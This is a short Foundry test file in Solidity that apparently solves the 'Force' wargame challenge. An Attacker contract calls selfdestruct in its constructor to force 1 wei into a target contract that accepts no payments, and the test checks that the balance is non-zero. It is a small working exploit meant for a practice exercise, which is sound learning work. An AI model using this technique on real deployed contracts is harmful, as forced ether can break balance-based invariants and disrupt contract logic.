// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";

contract ForceTest is Test {
    Force target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        target = new Force();
    }

    function attack() private {
        // just 1 wei is enough
        new Attacker{value: 1}(payable(address(target)));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertGt(address(target).balance, 0, "balance should be non-zero");
    }
}

contract Attacker {
    constructor(address payable _target) payable {
        // selfdestruct will "forcefully" transfer the money
        selfdestruct(_target);
    }
}
